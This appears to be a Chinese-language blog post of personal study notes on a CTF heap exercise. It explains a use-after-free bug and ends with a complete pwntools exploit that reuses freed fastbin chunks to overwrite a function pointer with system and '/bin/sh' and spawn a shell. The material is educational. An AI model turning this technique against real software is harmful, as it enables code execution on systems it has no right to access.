---
layout: post
title: "[PWN]堆漏洞利用UAF学习笔记"
date: 2025-12-26
categories: [PWN]
---
# UAF（释放后使用）
听说这个漏洞算是堆漏洞里最基础的，所以先从它开始，找了一道uaf的模板题来学习。

## 分析

第一步是用IDA逆向一下，然后发现了函数有四个功能，创建堆、释放堆、读取堆上的数据、退出。

![ref1](/assets/images/2025-12-26-uaf-study-note/ref1.png)

查看case2_delete，可以发现free了内存，但并没有把指针设为NULL，

![ref2](/assets/images/2025-12-26-uaf-study-note/ref2.png)

在case3_print中，则会使用相同的变量ptr以指针函数的形式来打印堆上的内容

![ref3](/assets/images/2025-12-26-uaf-study-note/ref3.png)

ptr + v1的内容，在case1_create中初始化，

![ref4](/assets/images/2025-12-26-uaf-study-note/ref4.png)

第一部分malloc固定初始化为init_content函数，大小0x10（这里很关键），里面包含了打印内容的printf，第二部分打印的内容则被初始化为malloc自定义大小分配的内存，并在后面接收用户输入。

![ref5](/assets/images/2025-12-26-uaf-study-note/ref5.png)

下面是init_content函数的内容

![ref6](/assets/images/2025-12-26-uaf-study-note/ref6.png)

create堆的时候，情况大概是这样
```
low
	content
	init_content
high
```

## 原理&利用
程序中自带了system和binsh，所以利用的思路就是把case3_print中的指针函数和指针变量换成system和binsh。控制这两个地方的方法就要用到uaf了。

首先，先create两个堆A和B，且自定义分配内容的内存的时候，尽量的比0x10大很多，比如0x100，注意到每次调用create的时候，实际上分配了两块内存，一块是放输出内容函数的固定大小的内存，一块是我们自定义大小的内存；然后free掉A，free掉B，那么此时释放的bin链表如下，

![ref7](/assets/images/2025-12-26-uaf-study-note/ref7.png)

由于我们给content设置了很大的值，所以它free以后会进其它的bin，就可以先不管。回看程序固定分配给输出函数的0x10的内存，由于这两块内存大小固定，又比较小，所以free以后会进fastchunk bin的链表，并且遵循filo的原则，B后面释放，所以链表的结构是B->A。

接下来我们需要再create一个C，并且此时设置内容的大小为0x10，那么根据堆的分配原则，会先从fastchunk bin中取出原先的struct B，来给struct C放init_content这个输出函数，然后分配器就会发现接下来还要再分配0x10（我们设置的），那么接着从链表里取出同为0x10大小的A，去给C的content。也就是说我们破坏了原先堆上的结构，使其变成了我们想要的样子，然后接下来由于指针没有设置为NULL，我们还可以进一步去利用没释放的指针去读、执行我们刚刚写的内容。

由于struct A的内存部分原先是设置为init_content的内容的，现在我们通过C的content改了A的struct，那么再去调用case3_print用函数指针执行，就可以不执行init_content而是执行我们设置的system('binsh')了。exp如下：

```python
from pwn import *

p = process('./pwn')
elf = ELF('./pwn')
context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']
#gdb.attach(p, 'b main')

def create(size, content):
    p.sendlineafter("Your choice:", "1")
    p.sendlineafter("Please input size:", str(size))
    p.sendafter("Please input content:", content)
    
def delete(idx):
    p.sendlineafter("Your choice:", "2")
    p.sendlineafter("Please input list index:", str(idx))
    
def show(idx):
    p.sendlineafter("Your choice:", "3")
    p.sendlineafter("Please input list index:", str(idx))
    
create(0x100, "A"*0x100)
create(0x100, "B"*0x100)
delete(0)
delete(1)
create(0x10, p64(0x602010) + p64(0x4007a0))
show(0)
p.interactive()
```

